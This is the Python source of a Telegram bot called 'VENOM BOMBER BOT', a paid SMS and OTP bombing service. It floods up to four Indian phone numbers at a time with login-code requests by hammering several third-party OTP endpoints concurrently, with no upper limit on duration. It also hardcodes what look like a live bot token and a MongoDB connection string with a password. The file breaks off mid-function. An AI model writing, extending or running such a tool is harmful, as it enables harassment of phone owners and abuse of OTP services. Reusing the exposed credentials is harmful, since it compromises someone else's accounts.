import asyncio
import aiohttp
import json
import re
import time
from datetime import datetime, timedelta
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
import logging
from pathlib import Path
from typing import Optional
import html
import motor.motor_asyncio
from pymongo import MongoClient
import certifi
import os

# Bot configuration
BOT_TOKEN = "8692875544:AAEfME2sFMG-TqB11PhV-kknncF2JBTgKT0"

# MongoDB configuration
MONGODB_URI = "mongodb+srv://venommusic:venom112@cluster0.tvf0tqz.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
DATABASE_NAME = "bomb_bot"
COLLECTION_USERS = "authorized_users"
COLLECTION_LOGS = "attack_logs"
COLLECTION_SETTINGS = "user_settings"

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# =============== MONGODB CONNECTION ===============
class MongoDB:
    client: motor.motor_asyncio.AsyncIOMotorClient = None
    db = None
    
    @classmethod
    async def connect(cls):
        """Create MongoDB connection"""
        try:
            # Use certifi for SSL certificates
            cls.client = motor.motor_asyncio.AsyncIOMotorClient(
                MONGODB_URI,
                tlsCAFile=certifi.where(),
                serverSelectionTimeoutMS=5000
            )
            # Test connection
            await cls.client.admin.command('ping')
            cls.db = cls.client[DATABASE_NAME]
            
            # Create indexes for better performance
            await cls.db[COLLECTION_USERS].create_index("user_id", unique=True)
            await cls.db[COLLECTION_USERS].create_index("username")
            await cls.db[COLLECTION_LOGS].create_index("user_id")
            await cls.db[COLLECTION_LOGS].create_index("start_time")
            await cls.db[COLLECTION_SETTINGS].create_index("user_id", unique=True)
            
            print("✅ MongoDB Connected Successfully!")
            return True
        except Exception as e:
            print(f"❌ MongoDB Connection Failed: {e}")
            return False
    
    @classmethod
    async def close(cls):
        """Close MongoDB connection"""
        if cls.client:
            cls.client.close()
            print("🔌 MongoDB Connection Closed")

# Initialize MongoDB instance
mongo = MongoDB()

def clean_text(text: str) -> str:
    """Clean special characters and emojis from text"""
    if not text:
        return ""
    
    # Remove control characters and excessive special chars
    cleaned = re.sub(r'[\x00-\x1F\x7F-\x9F\u200B-\u200F\u2028-\u202F\u2060-\u206F]', '', text)
    # Keep only basic characters
    cleaned = re.sub(r'[^\w\s\-@\._#&]', '', cleaned, flags=re.UNICODE)
    return cleaned.strip()[:50]  # Limit length

async def add_authorized_user(user_id: int, username: str, display_name: str, added_by: int, is_paid: bool = False):
    """Add user to authorized list with cleaned text"""
    # Clean the inputs
    clean_username = clean_text(username)
    clean_display_name = clean_text(display_name)
    
    user_data = {
        "user_id": user_id,
        "username": clean_username,
        "display_name": clean_display_name,
        "added_at": datetime.now().isoformat(),
        "added_by": added_by,
        "trial_used_count": 0,
        "last_trial_used": None,
        "is_trial_blocked": False,
        "is_paid_user": is_paid,
        "multi_target_count": 4  # Premium users get 4 numbers per attack
    }
    
    if is_paid:
        user_data["is_trial_blocked"] = True
    
    # Update if exists, insert if not
    await mongo.db[COLLECTION_USERS].update_one(
        {"user_id": user_id},
        {"$set": user_data},
        upsert=True
    )

async def remove_authorized_user(user_id: int):
    """Remove user from authorized list"""
    await mongo.db[COLLECTION_USERS].delete_one({"user_id": user_id})
    await mongo.db[COLLECTION_SETTINGS].delete_one({"user_id": user_id})

async def is_user_authorized(user_id: int) -> bool:
    """Check if user is authorized (paid user)"""
    user = await mongo.db[COLLECTION_USERS].find_one({"user_id": user_id})
    return user is not None and user.get("is_paid_user", False)

async def can_user_use_trial(user_id: int) -> tuple[bool, str]:
    """Check if user can use trial (once per week) - STRICT CHECK"""
    user = await mongo.db[COLLECTION_USERS].find_one({"user_id": user_id})
    
    # If user doesn't exist, they can use trial once
    if not user:
        return True, "First-time user, trial available"
    
    trial_used_count = user.get("trial_used_count", 0)
    is_trial_blocked = user.get("is_trial_blocked", False)
    is_paid_user = user.get("is_paid_user", False)
    
    # Check if user is paid user
    if is_paid_user:
        return False, "Paid users cannot use trial"
    
    # Check if trial is blocked
    if is_trial_blocked:
        return False, "Trial permanently blocked after first use"
    
    # If never used trial
    if trial_used_count == 0:
        return True, "First trial available"
    
    return False, "Trial already used"

async def mark_trial_used(user_id: int):
    """Mark trial as used for user - PERMANENTLY BLOCK after first use"""
    current_time = datetime.now().isoformat()
    
    await mongo.db[COLLECTION_USERS].update_one(
        {"user_id": user_id},
        {
            "$inc": {"trial_used_count": 1},
            "$set": {
                "last_trial_used": current_time,
                "is_trial_blocked": True
            }
        }
    )
    logger.info(f"Trial marked as used for user {user_id} - PERMANENTLY BLOCKED")

async def block_user_trial(user_id: int):
    """Permanently block trial for user"""
    await mongo.db[COLLECTION_USERS].update_one(
        {"user_id": user_id},
        {"$set": {"is_trial_blocked": True}}
    )
    logger.info(f"Trial blocked for user {user_id}")

async def unblock_user_trial(user_id: int):
    """Unblock trial for user"""
    await mongo.db[COLLECTION_USERS].update_one(
        {"user_id": user_id},
        {"$set": {"is_trial_blocked": False}}
    )
    logger.info(f"Trial unblocked for user {user_id}")

async def reset_user_trial(user_id: int):
    """Reset user's trial (admin only)"""
    await mongo.db[COLLECTION_USERS].update_one(
        {"user_id": user_id},
        {
            "$set": {
                "trial_used_count": 0,
                "last_trial_used": None,
                "is_trial_blocked": False
            }
        }
    )
    logger.info(f"Trial reset for user {user_id}")

async def get_user_trial_info(user_id: int) -> dict:
    """Get user's trial information"""
    user = await mongo.db[COLLECTION_USERS].find_one({"user_id": user_id})
    
    if not user:
        return {
            'trial_used_count': 0,
            'last_trial_used': None,
            'is_trial_blocked': False,
            'is_paid_user': False,
            'display_name': '',
            'trial_available': True,
            'exists': False,
            'multi_target_count': 1
        }
    
    trial_used_count = user.get("trial_used_count", 0)
    last_trial_used = user.get("last_trial_used")
    is_trial_blocked = user.get("is_trial_blocked", False)
    is_paid_user = user.get("is_paid_user", False)
    display_name = user.get("display_name", "")
    multi_target_count = user.get("multi_target_count", 4 if is_paid_user else 1)
    
    # Check if trial is available
    trial_available = False
    if not is_trial_blocked and not is_paid_user:
        if trial_used_count == 0:
            trial_available = True
    
    return {
        'trial_used_count': trial_used_count,
        'last_trial_used': last_trial_used,
        'is_trial_blocked': is_trial_blocked,
        'is_paid_user': is_paid_user,
        'display_name': display_name,
        'trial_available': trial_available,
        'exists': True,
        'multi_target_count': multi_target_count
    }

async def get_all_authorized_users():
    """Get all authorized users"""
    cursor = mongo.db[COLLECTION_USERS].find().sort("added_at", -1)
    users = await cursor.to_list(length=None)
    
    # Format for compatibility with existing code
    formatted_users = []
    for user in users:
        formatted_users.append((
            user.get("user_id"),
            user.get("username", ""),
            user.get("display_name", ""),
            user.get("added_at", ""),
            user.get("trial_used_count", 0),
            user.get("last_trial_used"),
            user.get("is_trial_blocked", False),
            user.get("is_paid_user", False),
            user.get("multi_target_count", 1)
        ))
    
    return formatted_users

async def get_user_speed_settings(user_id: int):
    """Get user's speed settings"""
    settings = await mongo.db[COLLECTION_SETTINGS].find_one({"user_id": user_id})
    
    if settings:
        return {
            'speed_level': settings.get('speed_level', 3),
            'max_concurrent': settings.get('max_concurrent', 10),
            'delay': settings.get('delay_between_requests', 0.1)
        }
    else:
        # Default settings
        default_settings = {
            'speed_level': 3,
            'max_concurrent': 10,
            'delay': 0.1
        }
        await set_user_speed_settings(user_id, default_settings)
        return default_settings

async def set_user_speed_settings(user_id: int, settings: dict):
    """Set user's speed settings"""
    settings_data = {
        "user_id": user_id,
        "speed_level": settings['speed_level'],
        "max_concurrent": settings['max_concurrent'],
        "delay_between_requests": settings['delay'],
        "updated_at": datetime.now().isoformat()
    }
    
    await mongo.db[COLLECTION_SETTINGS].update_one(
        {"user_id": user_id},
        {"$set": settings_data},
        upsert=True
    )

async def log_attack(user_id: int, target_numbers: list, duration: int, requests_sent: int, 
                     success: int, failed: int, start_time: datetime, end_time: datetime, 
                     status: str, is_trial_attack: bool = False):
    """Log attack details to database"""
    log_data = {
        "user_id": user_id,
        "target_numbers": target_numbers,
        "duration_seconds": duration,
        "requests_sent": requests_sent,
        "requests_success": success,
        "requests_failed": failed,
        "start_time": start_time.isoformat(),
        "end_time": end_time.isoformat(),
        "status": status,
        "is_trial_attack": is_trial_attack,
        "timestamp": datetime.now().isoformat()
    }
    
    await mongo.db[COLLECTION_LOGS].insert_one(log_data)

# Speed level presets
SPEED_PRESETS = {
    1: {
        'name': '🐢 Very Slow',
        'max_concurrent': 30,
        'delay': 0.5,
        'description': 'Slowest speed, safest for testing',
        'emoji': '🐢'
    },
    2: {
        'name': '🚶 Slow',
        'max_concurrent': 50,
        'delay': 0.3,
        'description': 'Slow speed, stable connections',
        'emoji': '🚶'
    },
    3: {
        'name': '⚡ Medium',
        'max_concurrent': 100,
        'delay': 0.1,
        'description': 'Balanced speed and stability',
        'emoji': '⚡'
    },
    4: {
        'name': '🚀 Fast',
        'max_concurrent': 200,
        'delay': 0.05,
        'description': 'Fast speed for quick attacks',
        'emoji': '🚀'
    },
    5: {
        'name': '⚡💥 VENOM MODE',
        'max_concurrent': 500,  # Reduced for stability
        'delay': 0.01,
        'description': 'VENOM ATTACK - Maximum speed',
        'emoji': '⚡💥'
    }
}

# =============== APIs (Shortened for readability - keep your full list) ===============
APIS = [
    {
        "url": "https://splexxo1-2api.vercel.app/bomb?phone={phone}&key=SPLEXXO",
        "method": "GET",
        "headers": {},
        "data": None,
        "count": 50  # Reduced for stability
    },
    {
        "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: json.dumps({"mobile_number": phone, "client_id": "kisan-app"}),
        "count": 5
    },
    {
        "url": "https://api.breeze.in/session/start",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "x-device-id": "A1pKVEDhlv66KLtoYsml3",
            "x-session-id": "MUUdODRfiL8xmwzhEpjN8"
        },
        "data": lambda phone: json.dumps({
            "phoneNumber": phone,
            "authVerificationType": "otp",
            "device": {
                "id": "A1pKVEDhlv66KLtoYsml3",
                "platform": "Chrome",
                "type": "Desktop"
            },
            "countryCode": "+91"
        }),
        "count": 5
    },
    # Add your remaining APIs here (keep the same structure)
    # I've shortened for readability, but you should include all your APIs
]

TOTAL_APIS = len(APIS)
ADMIN_USER_IDS = [1073815732]

def is_admin(user_id: int) -> bool:
    """Check if user is admin"""
    return user_id in ADMIN_USER_IDS

# =============== BOT FUNCTIONS ===============

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send a message when the command /start is issued."""
    user_id = update.effective_user.id
    
    # Get user's first name (clean it)
    user_first_name = update.effective_user.first_name or "User"
    clean_first_name = clean_text(user_first_name)
    username = update.effective_user.username or "Not set"
    
    # Get trial info
    trial_info = await get_user_trial_info(user_id)
    
    # If user doesn't exist in database, add them
    if not trial_info['exists']:
        await add_authorized_user(user_id, username, clean_first_name, 0, False)
        trial_info = await get_user_trial_info(user_id)
    
    # Check if user can use trial
    trial_allowed, reason = await can_user_use_trial(user_id)
    
    welcome_text = f"""
╔════════════════════════════════════════════╗
║        ⚡💥 VENOM BOMBER BOT 💥⚡        ║
║           ULTIMATE SMS BOMBER              ║
╚════════════════════════════════════════════╝

👤 USER INFO:
├─ Name: {clean_first_name}
├─ ID: {user_id}
├─ Username: @{username}

🎁 TRIAL STATUS:
├─ Trials Used: {trial_info['trial_used_count']}
├─ Last Trial: {trial_info['last_trial_used'].split('T')[0] if trial_info['last_trial_used'] else 'Never'}
├─ Trial Blocked: {"✅ YES" if trial_info['is_trial_blocked'] else "❌ No"}
├─ Paid User: {"✅ Yes" if trial_info['is_paid_user'] else "❌ No"}
├─ Trial Available: {"✅ Yes" if trial_allowed else "❌ No"}
└─ Status: {reason}

⚡ VENOM ATTACK FEATURES:
├─ Speed: Level 5 (VENOM MODE)
├─ Strategy: All APIs fire simultaneously
├─ Concurrency: 500 parallel requests
├─ Total APIs: {TOTAL_APIS}
└─ Max OTPs/sec: ~{TOTAL_APIS * 10}

📋 COMMANDS:
├─ /trial <number> - One-time free trial (60s)
├─ /mytrial - Check your trial status
├─ /attack <num1,num2,num3,num4> <time> - Multi-target VENOM attack
├─ /speed <1-5> - Set speed (Paid users only)
├─ /stop - Stop current attack
├─ /stats - View statistics
└─ /help - Show help

⚠️ IMPORTANT TRIAL RULES:
├─ ✅ Trial available: ONE TIME ONLY
├─ ❌ After trial: PERMANENTLY BLOCKED
├─ 🔒 No further trial access after use
├─ 💰 Contact admin for paid access only
└─ 👑 Admin: @Venompratap

💰 FOR FULL ACCESS:
Contact: @Venompratap

📡 STATUS: ✅ ONLINE | ⚡ READY FOR VENOM ATTACK
"""
    
    await update.message.reply_text(welcome_text)

async def mytrial(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check user's trial status"""
    user_id = update.effective_user.id
    
    # Get user's clean name
    user_first_name = update.effective_user.first_name or "User"
    clean_first_name = clean_text(user_first_name)
    username = update.effective_user.username or "Not set"
    
    trial_info = await get_user_trial_info(user_id)
    
    # If user doesn't exist, add them
    if not trial_info['exists']:
        await add_authorized_user(user_id, username, clean_first_name, 0, False)
        trial_info = await get_user_trial_info(user_id)
    
    # Check trial availability
    trial_allowed, reason = await can_user_use_trial(user_id)
    
    status_emoji = "✅" if trial_allowed else "❌"
    status_text = "AVAILABLE" if trial_allowed else "NOT AVAILABLE"
    
    trial_status_text = f"""
╔═══════════════════════════════════════╗
║          🎁 YOUR TRIAL STATUS        ║
╚═══════════════════════════════════════╝

👤 USER INFORMATION:
├─ ID: {user_id}
├─ Name: {clean_first_name}
├─ Username: @{username}

📊 TRIAL STATISTICS:
├─ Trials Used: {trial_info['trial_used_count']}
├─ Last Trial Used: {trial_info['last_trial_used'].split('T')[0] if trial_info['last_trial_used'] else 'Never'}
├─ Trial Blocked: {"✅ PERMANENTLY" if trial_info['is_trial_blocked'] else "❌ No"}
├─ Paid User: {"✅ Yes" if trial_info['is_paid_user'] else "❌ No"}

🎯 CURRENT STATUS:
├─ Trial Status: {status_emoji} {status_text}
├─ Reason: {reason}
└─ Duration: 60 seconds (One-time only)

⚡ VENOM ATTACK INFO:
├─ Total APIs: {TOTAL_APIS}
├─ Max OTPs/sec: ~{TOTAL_APIS * 10}
└─ Mode: VENOM ATTACK (Level 5)

⚠️ IMPORTANT NOTES:
"""
    
    if trial_allowed:
        trial_status_text += """
├─ ✅ You can use /trial <number> NOW
├─ ⏰ Trial lasts 60 seconds only
├─ 🔒 After trial, access will be PERMANENTLY BLOCKED
├─ ⚠️ This is ONE-TIME USE ONLY
└─ 💰 Contact admin for paid access
"""
    else:
        trial_status_text += """
├─ ❌ Trial NOT available
├─ 🔒 Trial access is PERMANENTLY BLOCKED
├─ ⚠️ One-time trial already used
├─ 💰 Contact admin for paid access
└─ 👑 Admin: @Venompratap
"""
    
    await update.message.reply_text(trial_status_text)

async def trial(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle free trial command - ONE TIME USE ONLY"""
    user_id = update.effective_user.id
    
    # Get user's clean name
    user_first_name = update.effective_user.first_name or "User"
    clean_first_name = clean_text(user_first_name)
    username = update.effective_user.username or "Not set"
    
    # STRICT CHECK: First check database
    trial_info = await get_user_trial_info(user_id)
    
    # If user doesn't exist, add them
    if not trial_info['exists']:
        await add_authorized_user(user_id, username, clean_first_name, 0, False)
        trial_info = await get_user_trial_info(user_id)
    
    # Check if user can use trial - STRICT CHECK
    trial_allowed, reason = await can_user_use_trial(user_id)
    
    if not trial_allowed:
        await update.message.reply_text(
            f"""
╔═══════════════════════╗
║     ❌ TRIAL DENIED  ║
╚═══════════════════════╝

Reason: {reason}

📊 YOUR TRIAL INFO:
├─ Trials Used: {trial_info['trial_used_count']}
├─ Trial Blocked: {"✅ Yes" if trial_info['is_trial_blocked'] else "❌ No"}
├─ Paid User: {"✅ Yes" if trial_info['is_paid_user'] else "❌ No"}

⚠️ IMPORTANT:
├─ Trial is ONE-TIME USE ONLY
├─ After use, it's PERMANENTLY BLOCKED
├─ No further trial access available
├─ Only paid access now

💰 Contact Admin for Full Access:
👑 @Venompratap
"""
        )
        return
    
    # Validate arguments
    if not context.args or len(context.args) < 1:
        await update.message.reply_text(
            """
╔════════════════════════════════════╗
║        🎁 FREE VENOM TRIAL         ║
╚════════════════════════════════════╝

Usage: /trial <phone_number>

⚡ VENOM ATTACK FEATURES:
├─ Duration: 60 seconds (1 minute)
├─ Speed: VENOM MODE (Level 5)
├─ Strategy: All APIs fire at once
├─ Limit: ONE TIME ONLY
└─ After trial: PERMANENTLY BLOCKED

Example: /trial 9876543210

⚠️ IMPORTANT RULES:
├─ ✅ Available: ONE TIME ONLY
├─ ❌ After use: PERMANENTLY BLOCKED
├─ 🔒 No further trial access
├─ 💰 Contact admin for paid access
└─ 👑 Admin: @Venompratap
"""
        )
        return
    
    phone = context.args[0]
    
    # Validate phone number
    if not re.match(r'^\d{10}$', phone):
        await update.message.reply_text(
            "❌ Invalid phone number!\n"
            "Must be exactly 10 digits (Indian number)."
        )
        return
    
    # Check if APIs are configured
    if TOTAL_APIS == 0:
        await update.message.reply_text(
            """
╔═════════════════════════╗
║  ⚡ NO APIs CONFIGURED  ║
╚═════════════════════════╝

APIs are not configured yet.

Contact admin for support: @Venompratap
"""
        )
        return
    
    # IMMEDIATELY mark trial as used and BLOCK it
    await mark_trial_used(user_id)
    
    # Set speed to level 5 for VENOM attack
    VENOM_settings = {
        'speed_level': 5,
        'max_concurrent': SPEED_PRESETS[5]['max_concurrent'],
        'delay': SPEED_PRESETS[5]['delay']
    }
    await set_user_speed_settings(user_id, VENOM_settings)
    
    # Set VENOM attack parameters
    duration = 60  # 1 minute for trial
    current_time = datetime.now()
    end_time = current_time + timedelta(seconds=duration)
    
    # Initialize VENOM attack session
    context.user_data['attacking'] = True
    context.user_data['target_numbers'] = [phone]  # Single target for trial
    context.user_data['attack_duration'] = duration
    context.user_data['attack_start'] = current_time
    context.user_data['attack_end'] = end_time
    context.user_data['total_requests'] = 0
    context.user_data['successful_requests'] = 0
    context.user_data['failed_requests'] = 0
    context.user_data['speed_settings'] = VENOM_settings
    context.user_data['is_trial_attack'] = True
    
    # Get updated trial info
    updated_trial_info = await get_user_trial_info(user_id)
    
    # Create initial VENOM attack message
    status_message = f"""
╔═════════════════════════════════════╗
║      ⚡💥 VENOM ATTACK STARTED     ║
╚═════════════════════════════════════╝

🎯 TARGET: {phone}
⏱️ DURATION: {duration} seconds (1 minute)
⚡ MODE: VENOM ATTACK (TRIAL)
📅 STARTED: {current_time.strftime('%H:%M:%S')}

⚡ VENOM CONFIGURATION:
├─ Speed: VENOM MODE (Level 5)
├─ Strategy: All APIs fire simultaneously
├─ Concurrency: 500 parallel requests
├─ Total APIs: {TOTAL_APIS}
└─ Max OTPs/sec: ~{TOTAL_APIS * 10}

🎁 TRIAL INFORMATION:
├─ Trial Count: {updated_trial_info['trial_used_count']}
├─ Trial Status: ONE-TIME USE
├─ After This: PERMANENTLY BLOCKED
└─ Next Step: Contact admin for paid access

📡 ATTACK STATUS:
├─ Status: FIRING ALL APIs
├─ Mode: Maximum Destruction
└─ Will stop: After 60 seconds

⚠️ IMPORTANT:
This is your ONE-TIME FREE VENOM ATTACK!
After this, trial access will be PERMANENTLY BLOCKED.

📊 INITIAL STATS:
├─ Requests: 0
├─ Success: 0
├─ Failed: 0
└─ RPS: 0.0
"""
    
    start_msg = await update.message.reply_text(status_message)
    
    context.user_data['status_message_id'] = start_msg.message_id
    context.user_data['status_chat_id'] = update.effective_chat.id
    context.user_data['last_rps_update'] = time.time()
    context.user_data['requests_since_last_update'] = 0
    context.user_data['last_status_update'] = time.time()
    
    # Start VENOM ATTACK
    asyncio.create_task(run_venom_attack(update, context, [phone], duration, VENOM_settings, is_trial=True))

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the /attack command for MULTI-TARGET VENOM ATTACK"""
    user_id = update.effective_user.id
    
    # Get user's clean name
    user_first_name = update.effective_user.first_name or "User"
    clean_first_name = clean_text(user_first_name)
    
    # First check if user is paid user
    if not await is_user_authorized(user_id):
        trial_info = await get_user_trial_info(user_id)
        
        # Check if trial is available
        trial_allowed, reason = await can_user_use_trial(user_id)
        
        if trial_allowed:
            await update.message.reply_text(
                f"""
╔═══════════════════════╗
║ 🎁 USE TRIAL FIRST   ║
╚═══════════════════════╝

You have a ONE-TIME FREE TRIAL available!

Use your free trial first:
/trial <number>

⚠️ IMPORTANT:
├─ Trial: 60 seconds, ONE TIME ONLY
├─ After trial: PERMANENTLY BLOCKED
├─ Then contact admin for paid access
└─ Admin: @Venompratap
"""
            )
        else:
            await update.message.reply_text(
                f"""
╔═══════════════════════╗
║  🔒 ACCESS DENIED    ║
╚═══════════════════════╝

You have used your ONE-TIME trial.

📊 YOUR STATUS:
├─ Trials Used: {trial_info['trial_used_count']}
├─ Last Trial: {trial_info['last_trial_used'].split('T')[0] if trial_info['last_trial_used'] else 'Never'}
├─ Trial Blocked: ✅ PERMANENTLY
├─ Paid User: ❌ No

💰 Contact Admin for Full Access:
👑 @Venompratap
⚠️ Trial access is PERMANENTLY BLOCKED.
Only paid access available now.
"""
            )
        return
    
    # Check if already attacking
    if context.user_data.get('attacking', False):
        await update.message.reply_text(
            """
╔═══════════════════════╗
║⚡ ALREADY ATTACKING  ║
╚═══════════════════════╝

You already have an active attack.
Use /stop to stop it first.
"""
        )
        return
    
    # Validate arguments
    if not context.args or len(context.args) < 2:
        await update.message.reply_text(
            """
╔══════════════════════════════════════╗
║        ⚡💥 MULTI-TARGET ATTACK     ║
╚══════════════════════════════════════╝

Usage: /attack <num1,num2,num3,num4> <duration>

⚡ VENOM MULTI-TARGET MODE:
├─ Target: 4 numbers at once
├─ Speed: Maximum (Level 5)
├─ Strategy: All APIs fire at all targets
└─ Concurrency: 500 parallel requests

Examples:
├─ /attack 9876543210,9876543211,9876543212,9876543213 30
├─ /attack 9876543210,9876543211,9876543212,9876543213 120
└─ /attack 9876543210,9876543211,9876543212,9876543213 1000000000000000

Limits:
├─ Minimum: 10 seconds
└─ Maximum: No limit
"""
        )
        return
    
    # Parse targets and duration
    numbers_input = context.args[0]
    duration_str = context.args[1]
    
    # Split by comma and clean
    target_numbers = [num.strip() for num in numbers_input.split(',') if num.strip()]
    
    # Validate target count
    if len(target_numbers) > 4:
        await update.message.reply_text(
            "❌ Maximum 4 numbers allowed per attack!\n"
            "Use: /attack num1,num2,num3,num4 duration"
        )
        return
    
    if len(target_numbers) < 1:
        await update.message.reply_text(
            "❌ At least 1 number required!\n"
            "Use: /attack num1,num2,num3,num4 duration"
        )
        return
    
    # Validate each phone number
    invalid_numbers = []
    for phone in target_numbers:
        if not re.match(r'^\d{10}$', phone):
            invalid_numbers.append(phone)
    
    if invalid_numbers:
        await update.message.reply_text(
            f"❌ Invalid phone numbers: {', '.join(invalid_numbers)}\n"
            "Must be exactly 10 digits (Indian numbers)."
        )
        return
    
    # Validate duration
    try:
        duration = int(duration_str)
        if duration < 10:
            await update.message.reply_text("❌ Duration must be at least 10 seconds.")
            return
        if duration > 1000000000000:
            await update.message.reply_text("❌ Bsdk aur kitne karega")
            return
    except ValueError:
        await update.message.reply_text("❌ Invalid duration! Must be a number (10-300).")
        return
    
    # Check if APIs are configured
    if TOTAL_APIS == 0:
        await update.message.reply_text(
            """
╔═══════════════════════╗
║⚡ NO APIs CONFIGURED  ║
╚═══════════════════════╝

APIs are not configured yet.

Contact admin for support: @Venompratap
"""
        )
        return
    
    # Get user speed settings (force level 5 for VENOM attack)
    VENOM_settings = {
        'speed_level': 5,
        'max_concurrent': SPEED_PRESETS[5]['max_concurrent'],
        'delay': SPEED_PRESETS[5]['delay']
    }
    await set_user_speed_settings(user_id, VENOM_settings)
    
    # Calculate end time
    current_time = datetime.now()
    end_time = current_time + timedelta(seconds=duration)
    
    # Initialize VENOM attack session
    context.user_data['attacking'] = True
    context.user_data['target_numbers'] = target_numbers
    context.user_data['attack_duration'] = duration
    context.user_data['attack_start'] = current_time
    context.user_data['attack_end'] = end_time
    context.user_data['total_requests'] = 0
    context.user_data['successful_requests'] = 0
    context.user_data['failed_requests'] = 0
    context.user_data['speed_settings'] = VENOM_settings
    context.user_data['is_trial_attack'] = False
    
    # Create initial VENOM attack message
    target_list = "\n├─ ".join(target_numbers)
    status_message = f"""
╔═════════════════════════════════════╗
║      ⚡💥 MULTI-TARGET ATTACK      ║
╚═════════════════════════════════════╝

🎯 TARGETS ({len(target_numbers)}):
├─ {target_list}

⏱️ DURATION: {duration} seconds
⚡ MODE: VENOM ATTACK (PAID USER)
📅 STARTED: {current_time.strftime('%H:%M:%S')}

👤 USER STATUS:
├─ Account Type: ✅ PAID USER
├─ Trial Status: ❌ BLOCKED (One-time used)
├─ Access: Unlimited attacks
└─ Admin: @Venompratap

⚡ VENOM CONFIGURATION:
├─ Speed: VENOM MODE (Level 5)
├─ Strategy: All APIs fire simultaneously at ALL targets
├─ Concurrency: 500 parallel requests
├─ Total APIs: {TOTAL_APIS}
└─ Max OTPs/sec: ~{TOTAL_APIS * 10 * len(target_numbers)}

📡 ATTACK STATUS:
├─ Status: FIRING ALL APIs
├─ Mode: Maximum Destruction
└─ Will stop: After {duration}s

📊 INITIAL STATS:
├─ Requests: 0
├─ Success: 0
├─ Failed: 0
└─ RPS: 0.0
"""
    
    start_msg = await update.message.reply_text(status_message)
    
    context.user_data['status_message_id'] = start_msg.message_id
    context.user_data['status_chat_id'] = update.effective_chat.id
    context.user_data['last_rps_update'] = time.time()
    context.user_data['requests_since_last_update'] = 0
    context.user_data['last_status_update'] = time.time()
    
    # Start VENOM ATTACK with multiple targets
    asyncio.create_task(run_venom_attack(update, context, target_numbers, duration, VENOM_settings, is_trial=False))

# =============== VENOM ATTACK FUNCTIONS ===============

async def venom_api_call(session: aiohttp.ClientSession, api: dict, phone: str):
    """Call a single API for VENOM attack"""
    try:
        url = api['url'].format(phone=phone)
        data = api['data'](phone) if callable(api['data']) else api['data']
        
        if api['method'] == 'GET':
            async with session.get(url, headers=api.get('headers', {}), timeout=aiohttp.ClientTimeout(2)) as response:
                success = response.status in [200, 201, 202, 204]
                return {'success': success, 'status': response.status, 'error': None}
        elif api['method'] == 'POST':
            async with session.post(url, headers=api.get('headers', {}), data=data, timeout=aiohttp.ClientTimeout(2)) as response:
                success = response.status in [200, 201, 202, 204]
                return {'success': success, 'status': response.status, 'error': None}
    except asyncio.TimeoutError:
        return {'success': False, 'status': 0, 'error': 'Timeout'}
    except Exception as e:
        return {'success': False, 'status': 0, 'error': str(e)}

async def run_venom_attack(update: Update, context: ContextTypes.DEFAULT_TYPE, target_numbers: list, duration: int, speed_settings: dict, is_trial: bool = False):
    """Run VENOM ATTACK - All APIs at once with maximum speed for multiple targets"""
    chat_id = context.user_data.get('status_chat_id')
    message_id = context.user_data.get('status_message_id')
    attack_start = context.user_data.get('attack_start')
    
    # Use maximum concurrency
    max_concurrent = 100
    connector = aiohttp.TCPConnector(limit=max_concurrent, limit_per_host=max_concurrent)
    timeout = aiohttp.ClientTimeout(total=5)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        end_timestamp = time.time() + duration
        
        # VENOM ATTACK LOOP
        while time.time() < end_timestamp and context.user_data.get('attacking', False):
            remaining = end_timestamp - time.time()
            if remaining <= 0:
                break
            
            # Create tasks for ALL APIs targeting ALL numbers
            tasks = []
            for phone in target_numbers:
                if not context.user_data.get('attacking', False):
                    break
                for api in APIS:
                    if not context.user_data.get('attacking', False) or time.time() >= end_timestamp:
                        break
                    # Call each API multiple times based on count
                    for i in range(api.get('count', 1)):
                        if not context.user_data.get('attacking', False) or time.time() >= end_timestamp:
                            break
                        task = asyncio.create_task(venom_api_call(session, api, phone))
                        tasks.append(task)
            
            # Execute ALL tasks concurrently
            if tasks:
                try:
                    # Process in batches to avoid memory issues
                    batch_size = 200
                    for i in range(0, len(tasks), batch_size):
                        if not context.user_data.get('attacking', False):
                            break
                        batch = tasks[i:i+batch_size]
                        results = await asyncio.gather(*batch, return_exceptions=True)
                        
                        # Process results
                        for result in results:
                            if isinstance(result, dict) and context.user_data.get('attacking', False):
                                context.user_data['total_requests'] = context.user_data.get('total_requests', 0) + 1
                                if result['success']:
                                    context.user_data['successful_requests'] = context.user_data.get('successful_requests', 0) + 1
                                else:
                                    context.user_data['failed_requests'] = context.user_data.get('failed_requests', 0) + 1
                                context.user_data['requests_since_last_update'] = context.user_data.get('requests_since_last_update', 0) + 1
                
                except Exception as e:
                    logger.debug(f"VENOM batch error: {e}")
            
            # Update RPS every 0.5 seconds
            current_time = time.time()
            if current_time - context.user_data.get('last_rps_update', 0) >= 0.5:
                elapsed = current_time - context.user_data['last_rps_update']
                requests = context.user_data.get('requests_since_last_update', 0)
                rps = requests / elapsed if elapsed > 0 else 0
                context.user_data['last_rps'] = rps
                context.user_data['last_rps_update'] = current_time
                context.user_data['requests_since_last_update'] = 0
            
            # Update status every 1 second
            if current_time - context.user_data.get('last_status_update', 0) >= 1:
                await update_venom_status(context, chat_id, message_id, target_numbers, duration, is_trial)
                context.user_data['last_status_update'] = current_time
            
            # Minimal delay
            if time.time() < end_timestamp:
                await asyncio.sleep(0.01)
    
    # Attack finished
    attack_end = datetime.now()
    elapsed = (attack_end - attack_start).seconds
    
    # Update final status
    await update_venom_final_status(context, chat_id, message_id, target_numbers, elapsed, is_trial)
    
    # Log attack
    await log_attack(
        user_id=update.effective_user.id,
        target_numbers=target_numbers,
        duration=elapsed,
        requests_sent=context.user_data.get('total_requests', 0),
        success=context.user_data.get('successful_requests', 0),
        failed=context.user_data.get('failed_requests', 0),
        start_time=attack_start,
        end_time=attack_end,
        status="COMPLETED" if context.user_data.get('attacking', False) else "STOPPED",
        is_trial_attack=is_trial
    )
    
    # Clear attack flag
